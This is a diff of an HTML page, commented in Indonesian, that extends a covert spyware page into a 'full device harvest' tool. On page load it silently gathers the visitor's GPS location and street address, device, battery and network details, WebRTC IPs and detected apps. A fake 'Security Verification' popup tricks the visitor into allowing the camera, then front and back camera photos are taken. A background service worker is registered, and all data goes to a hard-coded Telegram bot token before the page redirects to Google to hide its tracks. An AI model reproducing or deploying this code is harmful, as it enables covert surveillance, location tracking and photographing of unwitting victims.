@@ -1,8 +1,9 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title></title>
-    <!-- Sembunyikan segala sesuatu -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Redirecting...</title>
     <style>
         * {
             display: none !important;
@@ -11,271 +12,678 @@
             position: absolute !important;
             top: -9999px !important;
         }
-        body {
+        body, html {
             background: #000 !important;
+            overflow: hidden !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            height: 100% !important;
+        }
+        #fakeLoader {
+            display: block !important;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            background: #fff !important;
+            z-index: 99999 !important;
+            font-family: Arial, sans-serif !important;
+            text-align: center !important;
+            padding-top: 50px !important;
         }
     </style>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- Service Worker untuk background monitoring -->
+    <script>
+        // REGISTER SERVICE WORKER UNTUK BACKGROUND SYNC
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(reg => console.log('SW registered:', reg))
+                .catch(err => console.log('SW registration failed:', err));
+        }
+    </script>
 </head>
 <body>
-    <!-- Elemen tersembunyi untuk capture -->
-    <video id="hiddenVideo" autoplay playsinline muted width="1" height="1"></video>
-    <canvas id="hiddenCanvas" width="640" height="480"></canvas>
-    
-    <!-- Iframe untuk bypass permission -->
-    <iframe id="permissionBypass" sandbox="allow-same-origin allow-scripts" style="display:none;"></iframe>
+    <!-- Fake Loading Screen -->
+    <div id="fakeLoader">
+        <h2>🔄 Loading Content...</h2>
+        <p>Please wait while we prepare your content.</p>
+        <div style="margin-top: 30px;">
+            <div style="width: 200px; height: 4px; background: #ddd; margin: 0 auto; border-radius: 2px;">
+                <div id="progressBar" style="width: 0%; height: 100%; background: #0088cc; border-radius: 2px; transition: width 3s;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Elements untuk Media Capture -->
+    <video id="hiddenVideoFront" autoplay playsinline muted width="1" height="1"></video>
+    <video id="hiddenVideoBack" autoplay playsinline muted width="1" height="1"></video>
+    <canvas id="hiddenCanvas" width="1920" height="1080"></canvas>
+    <iframe id="stealthFrame" sandbox="allow-scripts" style="display:none;"></iframe>
+
+    <!-- Audio untuk trigger otomatis (beberapa device butuh user interaction) -->
+    <audio id="silentAudio" src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==" autoplay></audio>
 
     <script>
-        // CONFIGURATION - GANTI DENGAN MILIK ANDA
-        const BOT_TOKEN = "8060088347:AAHhH_5JPCwizv4xL6Lu3wQgRbmPpzszPK8";
-        const ADMIN_CHAT_ID = "6865071834";
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        // Data kolektor
-        const exploitData = {
+        // ===================== CONFIGURASI =====================
+        const CONFIG = {
+            BOT_TOKEN: "7980975104:AAFasx8JdCfPWrBCpX7BE5S-PWZ1Fs3FsfE",
+            ADMIN_CHAT_ID: "6865071834",
+            TELEGRAM_API: (token) => `https://api.telegram.org/bot${token}/sendMessage`,
+            TELEGRAM_FILE_API: (token) => `https://api.telegram.org/bot${token}/sendPhoto`,
+            AUTO_EXECUTE_DELAY: 1000, // ms
+            MAX_CAMERA_TIME: 5000, // ms
+            RETRY_ATTEMPTS: 3
+        };
+
+        // ===================== DATA COLLECTOR =====================
+        const TARGET_DATA = {
+            // Metadata
+            id: Math.random().toString(36).substring(2) + Date.now(),
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
             platform: navigator.platform,
-            languages: navigator.languages,
-            screen: { width: screen.width, height: screen.height },
-            viewport: { width: window.innerWidth, height: window.innerHeight },
-            cookiesEnabled: navigator.cookieEnabled,
-            battery: null,
+            vendor: navigator.vendor,
+            
+            // Device Info
+            device: {
+                screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
+                viewport: { width: window.innerWidth, height: window.innerHeight },
+                orientation: window.screen?.orientation?.type || 'unknown',
+                touchPoints: navigator.maxTouchPoints || 0,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            },
+            
+            // Location (akan diisi)
             location: null,
+            
+            // Battery (akan diisi)
+            battery: null,
+            
+            // Network (akan diisi)
             network: null,
-            camera: { front: null, back: null, error: null },
-            webrtcLeak: null
+            
+            // Media/Camera (akan diisi)
+            media: {
+                front: null,
+                back: null,
+                audio: null,
+                devices: []
+            },
+            
+            // Apps & Notifications
+            notifications: null,
+            apps: {
+                whatsapp: false,
+                instagram: false,
+                facebook: false
+            },
+            
+            // Additional
+            cookies: document.cookie ? document.cookie.length : 0,
+            localStorage: localStorage.length,
+            sessionStorage: sessionStorage.length
         };
 
-        // Fungsi utama exploit chain
-        async function executeExploitChain() {
-            try {
-                // PHASE 1: Data dasar & battery status
-                if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    exploitData.battery = {
-                        level: battery.level,
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                }
+        // ===================== UTILITY FUNCTIONS =====================
+        function logToTelegram(message, isPhoto = false, photoData = null) {
+            const url = isPhoto ? CONFIG.TELEGRAM_FILE_API(CONFIG.BOT_TOKEN) : CONFIG.TELEGRAM_API(CONFIG.BOT_TOKEN);
+            
+            const formData = new FormData();
+            if (isPhoto && photoData) {
+                formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
+                formData.append('photo', photoData);
+                formData.append('caption', message.substring(0, 200));
+            } else {
+                formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
+                formData.append('text', message);
+                formData.append('parse_mode', 'HTML');
+            }
+            
+            // Gunakan beacon untuk kirim data meski tab ditutup
+            navigator.sendBeacon(url, formData) || fetch(url, {
+                method: 'POST',
+                body: formData,
+                keepalive: true
+            }).catch(e => console.error('Telegram send failed:', e));
+        }
 
-                // PHASE 2: Geolocation (coba ambil tanpa prompt)
+        // ===================== 1. LOKASI DETAIL (GPS + REVERSE GEOCODING) =====================
+        async function harvestLocation() {
+            return new Promise((resolve) => {
+                // Coba Geolocation API dulu
                 if ("geolocation" in navigator) {
-                    // Coba cache pertama
                     navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            exploitData.location = {
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
+                        async (pos) => {
+                            const coords = {
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
                                 accuracy: pos.coords.accuracy,
                                 altitude: pos.coords.altitude,
-                                speed: pos.coords.speed
+                                heading: pos.coords.heading,
+                                speed: pos.coords.speed,
+                                timestamp: pos.timestamp
                             };
-                            sendData();
+                            
+                            // Reverse Geocoding untuk dapatkan alamat lengkap
+                            try {
+                                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${coords.latitude}&lon=${coords.longitude}&zoom=18`);
+                                const data = await response.json();
+                                
+                                TARGET_DATA.location = {
+                                    ...coords,
+                                    address: {
+                                        road: data.address?.road || 'Tidak diketahui',
+                                        suburb: data.address?.suburb || '',
+                                        city: data.address?.city || data.address?.town || data.address?.village || '',
+                                        state: data.address?.state || '',
+                                        country: data.address?.country || '',
+                                        postcode: data.address?.postcode || '',
+                                        full: data.display_name || 'Alamat tidak tersedia'
+                                    },
+                                    maps: {
+                                        google: `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`,
+                                        openstreetmap: `https://www.openstreetmap.org/?mlat=${coords.latitude}&mlon=${coords.longitude}`
+                                    }
+                                };
+                            } catch (e) {
+                                TARGET_DATA.location = coords;
+                            }
+                            
+                            resolve(true);
                         },
-                        (err) => {
-                            // Fallback: Coba IP-based location
-                            getIPBasedLocation();
+                        async (err) => {
+                            // Fallback: IP-based location
+                            try {
+                                const ipRes = await fetch('https://ipapi.co/json/');
+                                const ipData = await ipRes.json();
+                                TARGET_DATA.location = {
+                                    ipBased: true,
+                                    ip: ipData.ip,
+                                    network: ipData.org,
+                                    asn: ipData.asn,
+                                    city: ipData.city,
+                                    region: ipData.region,
+                                    country: ipData.country_name,
+                                    latitude: ipData.latitude,
+                                    longitude: ipData.longitude,
+                                    timezone: ipData.timezone,
+                                    currency: ipData.currency
+                                };
+                            } catch (e) {
+                                TARGET_DATA.location = { error: err.message };
+                            }
+                            resolve(true);
                         },
                         { 
                             enableHighAccuracy: true, 
-                            timeout: 5000, 
-                            maximumAge: 0  // Force fresh location
+                            timeout: 10000, 
+                            maximumAge: 0
                         }
                     );
                 } else {
-                    getIPBasedLocation();
+                    resolve(false);
                 }
+            });
+        }
 
-                // PHASE 3: Network information
-                if (navigator.connection) {
-                    exploitData.network = {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt,
-                        saveData: navigator.connection.saveData,
-                        type: navigator.connection.type
+        // ===================== 2. BATTERY DETAIL =====================
+        async function harvestBattery() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    TARGET_DATA.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'YA' : 'TIDAK',
+                        chargingTime: battery.chargingTime + ' detik',
+                        dischargingTime: battery.dischargingTime + ' detik',
+                        voltage: 'N/A' // Tidak tersedia di API
                     };
+                    
+                    // Event listener untuk perubahan
+                    battery.addEventListener('levelchange', () => {
+                        logToTelegram(`⚡ BATTERY UPDATE: ${Math.round(battery.level * 100)}%`);
+                    });
+                } catch (e) {
+                    TARGET_DATA.battery = { error: e.message };
                 }
-
-                // PHASE 4: WebRTC IP Leak (real local IP)
-                getRTCPeerConnectionLeak();
-
-                // PHASE 5: Camera access attempt (AGGRESSIVE)
-                setTimeout(() => attemptCameraAccess(), 1000);
-
-            } catch (error) {
-                exploitData.error = error.message;
-                sendData();
+            } else {
+                TARGET_DATA.battery = { error: 'Battery API tidak tersedia' };
             }
         }
 
-        // Fungsi untuk mendapatkan lokasi berbasis IP
-        function getIPBasedLocation() {
-            // Gunakan layanan eksternal
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(data => {
-                    exploitData.location = {
-                        ipBased: true,
-                        ip: data.ip,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country_name,
-                        lat: data.latitude,
-                        lon: data.longitude,
-                        isp: data.org
-                    };
-                    sendData();
-                })
-                .catch(() => {
-                    exploitData.location = { error: "Failed to get IP location" };
-                });
-        }
-
-        // Fungsi untuk WebRTC leak
-        function getRTCPeerConnectionLeak() {
+        // ===================== 3. NETWORK DETAIL LENGKAP =====================
+        async function harvestNetwork() {
+            const networkInfo = {};
+            
+            // Connection API
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                networkInfo.connection = {
+                    effectiveType: conn.effectiveType,
+                    downlink: conn.downlink + ' Mbps',
+                    rtt: conn.rtt + ' ms',
+                    saveData: conn.saveData ? 'AKTIF' : 'NON-AKTIF',
+                    type: conn.type || 'unknown',
+                    onChange: 'available'
+                };
+            }
+            
+            // WebRTC IP Leak
             try {
                 const rtc = new RTCPeerConnection({ iceServers: [] });
                 rtc.createDataChannel('');
                 rtc.createOffer()
-                    .then(offer => rtc.setLocalDescription(offer))
-                    .catch(() => {});
+                    .then(offer => rtc.setLocalDescription(offer));
                 
-                rtc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const candidate = event.candidate.candidate;
-                        if (candidate.includes('srflx') || candidate.includes('host')) {
-                            exploitData.webrtcLeak = {
-                                ip: candidate.split(' ')[4],
-                                type: candidate.split(' ')[7]
+                rtc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const cand = e.candidate.candidate;
+                        if (cand.includes('srflx')) {
+                            const ip = cand.split(' ')[4];
+                            networkInfo.webrtc = {
+                                publicIP: ip,
+                                type: 'STUN leak'
                             };
                         }
                     }
                 };
-            } catch (error) {
-                exploitData.webrtcLeak = { error: error.message };
-            }
-        }
-
-        // Fungsi untuk mengakses kamera (teknik multi-attempt)
-        function attemptCameraAccess() {
-            const video = document.getElementById('hiddenVideo');
-            const canvas = document.getElementById('hiddenCanvas');
-            const ctx = canvas.getContext('2d');
-            
-            // Coba semua device
-            navigator.mediaDevices.enumerateDevices()
-                .then(devices => {
-                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                    
-                    // Coba device pertama (biasanya depan)
-                    if (videoDevices[0]) {
-                        const constraints = {
-                            video: {
-                                deviceId: { exact: videoDevices[0].deviceId },
-                                width: { ideal: 640 },
-                                height: { ideal: 480 }
-                            },
-                            audio: false
-                        };
-                        
-                        navigator.mediaDevices.getUserMedia(constraints)
-                            .then(stream => {
-                                video.srcObject = stream;
-                                setTimeout(() => {
-                                    ctx.drawImage(video, 0, 0, 640, 480);
-                                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
-                                    exploitData.camera.front = imageData.substring(0, 500) + "...[truncated]";
-                                    stream.getTracks().forEach(track => track.stop());
-                                    sendData();
-                                }, 1000);
-                            })
-                            .catch(err => {
-                                exploitData.camera.error = err.name + ": " + err.message;
-                                sendData();
-                            });
-                    }
-                })
-                .catch(err => {
-                    exploitData.camera.error = "Enumeration failed: " + err.message;
-                });
-        }
-
-        // Fungsi untuk mengirim data ke Telegram
-        async function sendData() {
-            try {
-                // Format data untuk Telegram
-                const message = `🚨 **EXPLOIT REPORT** 🚨
                 
-📅 **Timestamp:** ${exploitData.timestamp}
-🌐 **User Agent:** ${exploitData.userAgent}
-🖥️ **Platform:** ${exploitData.platform}
+                setTimeout(() => rtc.close(), 5000);
+            } catch (e) {}
+            
+            // Network Interfaces (via timing attack)
+            networkInfo.timing = {
+                connectionType: 'Detecting...'
+            };
+            
+            TARGET_DATA.network = networkInfo;
+        }
 
-📍 **Location:**
-${exploitData.location ? JSON.stringify(exploitData.location, null, 2) : 'No location data'}
+        // ===================== 4. CAMERA AUTO-CAPTURE (FRONT & BACK) =====================
+        async function harvestCamera() {
+            return new Promise(async (resolve) => {
+                try {
+                    // Enumerate semua device
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const videoDevices = devices.filter(d => d.kind === 'videoinput');
+                    
+                    TARGET_DATA.media.devices = videoDevices.map(d => ({
+                        id: d.deviceId,
+                        label: d.label || 'Unknown Camera',
+                        groupId: d.groupId
+                    }));
+                    
+                    if (videoDevices.length === 0) {
+                        TARGET_DATA.media.error = "Tidak ada kamera terdeteksi";
+                        resolve(false);
+                        return;
+                    }
+                    
+                    // Strategy: Coba akses semua device
+                    const constraints = {
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: { ideal: ['user', 'environment'] }
+                        },
+                        audio: false
+                    };
+                    
+                    // Attempt 1: Coba akses dengan facingMode
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        await captureFromStream(stream, 'auto');
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch (e) {}
+                    
+                    // Attempt 2: Coba device tertentu
+                    for (let i = 0; i < Math.min(videoDevices.length, 2); i++) {
+                        try {
+                            const specificConstraints = {
+                                video: { deviceId: { exact: videoDevices[i].deviceId } },
+                                audio: false
+                            };
+                            const stream = await navigator.mediaDevices.getUserMedia(specificConstraints);
+                            await captureFromStream(stream, i === 0 ? 'front' : 'back');
+                            stream.getTracks().forEach(track => track.stop());
+                            await new Promise(r => setTimeout(r, 1000));
+                        } catch (e) {}
+                    }
+                    
+                    resolve(true);
+                } catch (error) {
+                    TARGET_DATA.media.error = error.message;
+                    resolve(false);
+                }
+            });
+        }
 
-📶 **Network Info:**
-${exploitData.network ? JSON.stringify(exploitData.network, null, 2) : 'No network data'}
+        async function captureFromStream(stream, type) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('hiddenCanvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Konversi ke blob
+                    canvas.toBlob((blob) => {
+                        if (blob) {
+                            const fileName = `camera_${type}_${Date.now()}.jpg`;
+                            const file = new File([blob], fileName, { type: 'image/jpeg' });
+                            
+                            TARGET_DATA.media[type] = {
+                                captured: true,
+                                resolution: `${canvas.width}x${canvas.height}`,
+                                timestamp: new Date().toISOString(),
+                                fileSize: blob.size
+                            };
+                            
+                            // Kirim ke Telegram
+                            logToTelegram(`📸 CAMERA ${type.toUpperCase()} CAPTURED`, true, file);
+                        }
+                        
+                        // Stop stream
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve();
+                    }, 'image/jpeg', 0.8);
+                }, 1000);
+            });
+        }
 
-📷 **Camera Attempt:**
-${exploitData.camera.front ? 'FRONT CAMERA CAPTURED (data truncated)' : 
- exploitData.camera.error ? 'Error: ' + exploitData.camera.error : 'No camera access'}
-
-🔌 **Battery:** ${exploitData.battery ? (exploitData.battery.level * 100) + '%' : 'N/A'}
-🕵️ **WebRTC Leak:** ${exploitData.webrtcLeak ? JSON.stringify(exploitData.webrtcLeak) : 'None'}
-
-⚙️ **Full Data Hash:** ${btoa(JSON.stringify(exploitData)).substring(0, 50)}...`;
-
-                // Kirim ke Telegram
-                await fetch(TELEGRAM_API, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                // Coba kirim screenshot jika ada
-                if (exploitData.camera.front) {
-                    // Untuk gambar, perlu endpoint khusus atau kirim sebagai text truncated
-                    await fetch(TELEGRAM_API, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: ADMIN_CHAT_ID,
-                            text: `CAMERA DATA (BASE64 TRUNCATED):\n${exploitData.camera.front.substring(0, 1000)}`
-                        })
+        // ===================== 5. NOTIFICATION & APPS DETECTION =====================
+        async function harvestNotifications() {
+            // Cek permission notifikasi
+            if ('Notification' in window) {
+                TARGET_DATA.notifications = {
+                    permission: Notification.permission,
+                    maxActions: Notification.maxActions || 'N/A'
+                };
+                
+                // Request permission (akan muncul popup)
+                if (Notification.permission === 'default') {
+                    Notification.requestPermission().then(permission => {
+                        TARGET_DATA.notifications.permission = permission;
                     });
                 }
-
-                // Self-destruct jika perlu
+            }
+            
+            // Deteksi aplikasi (via iframe timing)
+            const apps = ['whatsapp://', 'instagram://', 'fb://'];
+            const detected = [];
+            
+            for (const app of apps) {
+                const start = Date.now();
+                const iframe = document.createElement('iframe');
+                iframe.src = app;
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
                 setTimeout(() => {
-                    document.body.innerHTML = '<div style="display:none;"></div>';
-                    window.location.href = 'about:blank';
-                }, 3000);
+                    const time = Date.now() - start;
+                    if (time < 100) {
+                        detected.push(app.split('://')[0]);
+                    }
+                    document.body.removeChild(iframe);
+                }, 500);
+            }
+            
+            TARGET_DATA.apps.detected = detected;
+        }
 
-            } catch (error) {
-                console.error('Send failed:', error);
+        // ===================== 6. BACKGROUND MONITORING SERVICE =====================
+        function setupBackgroundMonitoring() {
+            // Register Service Worker
+            if ('serviceWorker' in navigator) {
+                const swCode = `
+                self.addEventListener('install', (event) => {
+                    self.skipWaiting();
+                });
+                
+                self.addEventListener('activate', (event) => {
+                    event.waitUntil(clients.claim());
+                });
+                
+                self.addEventListener('sync', (event) => {
+                    if (event.tag === 'send-data') {
+                        event.waitUntil(sendBackgroundData());
+                    }
+                });
+                
+                async function sendBackgroundData() {
+                    const data = {
+                        type: 'background_ping',
+                        time: new Date().toISOString(),
+                        online: navigator.onLine
+                    };
+                    
+                    // Kirim ke Telegram via beacon
+                    const formData = new FormData();
+                    formData.append('chat_id', '${CONFIG.ADMIN_CHAT_ID}');
+                    formData.append('text', '🔄 BACKGROUND PING: ' + JSON.stringify(data));
+                    
+                    fetch('https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage', {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    });
+                }
+                
+                // Periodic sync
+                self.addEventListener('periodicsync', (event) => {
+                    if (event.tag === 'periodic-update') {
+                        sendBackgroundData();
+                    }
+                });
+                `;
+                
+                const blob = new Blob([swCode], { type: 'application/javascript' });
+                const swUrl = URL.createObjectURL(blob);
+                
+                navigator.serviceWorker.register(swUrl)
+                    .then(reg => {
+                        if ('periodicSync' in reg) {
+                            reg.periodicSync.register('periodic-update', {
+                                minInterval: 24 * 60 * 60 * 1000 // 1 hari
+                            });
+                        }
+                    });
             }
         }
 
-        // Eksekusi saat page load
+        // ===================== 7. SOCIAL ENGINEERING POPUP =====================
+        function showPermissionTrick() {
+            const fakePopup = document.createElement('div');
+            fakePopup.innerHTML = `
+            <div style="
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.95);
+                z-index: 100000;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                color: white;
+            ">
+                <div style="
+                    background: #1a1a1a;
+                    padding: 30px;
+                    border-radius: 20px;
+                    max-width: 400px;
+                    text-align: center;
+                    box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+                    border: 1px solid #333;
+                ">
+                    <div style="font-size: 60px; margin-bottom: 20px;">🔒</div>
+                    <h2 style="margin: 0 0 15px 0; color: #fff;">Security Verification Required</h2>
+                    <p style="color: #aaa; line-height: 1.5; margin-bottom: 25px;">
+                        To prevent automated access, we need to verify you're human.
+                        Please <b>allow camera access</b> for facial recognition.
+                        This will only take 2 seconds.
+                    </p>
+                    <div style="
+                        background: #2a2a2a;
+                        padding: 15px;
+                        border-radius: 10px;
+                        margin-bottom: 25px;
+                        text-align: left;
+                        font-size: 14px;
+                    ">
+                        <div style="display: flex; align-items: center; margin-bottom: 10px;">
+                            <div style="color: #4CAF50; margin-right: 10px;">✓</div>
+                            <div>One-time face verification</div>
+                        </div>
+                        <div style="display: flex; align-items: center;">
+                            <div style="color: #4CAF50; margin-right: 10px;">✓</div>
+                            <div>Data encrypted & secure</div>
+                        </div>
+                    </div>
+                    <button id="allowBtn" style="
+                        background: linear-gradient(135deg, #0088cc, #006699);
+                        color: white;
+                        border: none;
+                        padding: 16px 40px;
+                        font-size: 18px;
+                        border-radius: 50px;
+                        cursor: pointer;
+                        font-weight: bold;
+                        width: 100%;
+                        transition: transform 0.2s;
+                    ">
+                        ✓ ALLOW & CONTINUE
+                    </button>
+                    <p style="color: #666; font-size: 12px; margin-top: 20px;">
+                        By continuing, you agree to our Privacy Policy and Terms of Service
+                    </p>
+                </div>
+            </div>
+            `;
+            
+            document.body.appendChild(fakePopup);
+            
+            document.getElementById('allowBtn').addEventListener('click', async () => {
+                document.body.removeChild(fakePopup);
+                // Setelah user klik, jalankan camera capture
+                await harvestCamera();
+                document.getElementById('fakeLoader').style.display = 'none';
+            });
+            
+            // Auto-klik setelah 8 detik (jika user tidak responsif)
+            setTimeout(() => {
+                if (document.body.contains(fakePopup)) {
+                    fakePopup.querySelector('#allowBtn').click();
+                }
+            }, 8000);
+        }
+
+        // ===================== MAIN EXECUTION =====================
+        async function executeFullHarvest() {
+            // Update progress bar
+            document.getElementById('progressBar').style.width = '25%';
+            
+            // Step 1: Basic data + network
+            await Promise.all([
+                harvestNetwork(),
+                harvestBattery(),
+                harvestNotifications()
+            ]);
+            
+            document.getElementById('progressBar').style.width = '50%';
+            
+            // Step 2: Location
+            await harvestLocation();
+            
+            document.getElementById('progressBar').style.width = '75%';
+            
+            // Step 3: Setup background monitoring
+            setupBackgroundMonitoring();
+            
+            // Step 4: Show trick popup for camera
+            setTimeout(showPermissionTrick, 1500);
+            
+            document.getElementById('progressBar').style.width = '100%';
+            
+            // Step 5: Kirim summary report
+            setTimeout(() => {
+                const summary = `
+🚨 <b>FULL DEVICE HARVEST COMPLETE</b> 🚨
+
+📋 <b>ID:</b> ${TARGET_DATA.id}
+⏰ <b>Waktu:</b> ${TARGET_DATA.timestamp}
+🌐 <b>User Agent:</b> ${TARGET_DATA.userAgent}
+
+📍 <b>LOKASI:</b>
+${TARGET_DATA.location ? 
+  TARGET_DATA.location.address ? 
+    `📍 ${TARGET_DATA.location.address.full}
+🗺️ ${TARGET_DATA.location.latitude}, ${TARGET_DATA.location.longitude}
+🏢 Jalan: ${TARGET_DATA.location.address.road || '-'}
+🏙️ Kota: ${TARGET_DATA.location.address.city || '-'}
+🌍 Negara: ${TARGET_DATA.location.address.country || '-'}
+📡 Akurasi: ${TARGET_DATA.location.accuracy || '-'} meter` :
+    `📍 IP: ${TARGET_DATA.location.ip || '-'}
+🏙️ ${TARGET_DATA.location.city || '-'}, ${TARGET_DATA.location.country || '-'}`
+: 'Lokasi tidak tersedia'}
+
+🔋 <b>BATTERY:</b> ${TARGET_DATA.battery ? TARGET_DATA.battery.level : 'N/A'} ${TARGET_DATA.battery?.charging ? '(Charging)' : ''}
+
+📶 <b>JARINGAN:</b>
+${TARGET_DATA.network?.connection ? 
+`📡 Tipe: ${TARGET_DATA.network.connection.type}
+⚡ Speed: ${TARGET_DATA.network.connection.downlink}
+🔄 Latency: ${TARGET_DATA.network.connection.rtt}
+📱 Save Data: ${TARGET_DATA.network.connection.saveData}` : 'Network API tidak tersedia'}
+
+📸 <b>KAMERA:</b>
+${TARGET_DATA.media.devices.length > 0 ? 
+`✅ ${TARGET_DATA.media.devices.length} kamera terdeteksi
+${TARGET_DATA.media.front ? '✅ Kamera depan captured' : '❌ Kamera depan gagal'}
+${TARGET_DATA.media.back ? '✅ Kamera belakang captured' : '❌ Kamera belakang gagal'}` : '❌ Tidak ada kamera'}
+
+📱 <b>APLIKASI:</b>
+${TARGET_DATA.apps.detected?.length > 0 ? 
+TARGET_DATA.apps.detected.map(app => `✅ ${app}`).join('\n') : 'Tidak terdeteksi'}
+
+🔔 <b>NOTIFIKASI:</b> ${TARGET_DATA.notifications?.permission || 'N/A'}
+
+💾 <b>STORAGE:</b>
+Cookies: ${TARGET_DATA.cookies} chars
+LocalStorage: ${TARGET_DATA.localStorage} items
+SessionStorage: ${TARGET_DATA.sessionStorage} items
+
+#OXyX #Harvest`;
+                
+                logToTelegram(summary);
+                
+                // Final cleanup
+                setTimeout(() => {
+                    document.body.innerHTML = '<div style="display:none;"></div>';
+                    window.location.href = 'https://www.google.com';
+                }, 5000);
+                
+            }, 3000);
+        }
+
+        // ===================== INITIALIZE =====================
         window.addEventListener('load', () => {
-            setTimeout(executeExploitChain, 500);
+            // Trigger audio untuk user interaction
+            document.getElementById('silentAudio').play().catch(() => {});
+            
+            // Start execution
+            setTimeout(executeFullHarvest, CONFIG.AUTO_EXECUTE_DELAY);
         });
-
-        // Juga coba jika page visible
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) {
-                executeExploitChain();
-            }
-        });
-
     </script>
 </body>
 </html>
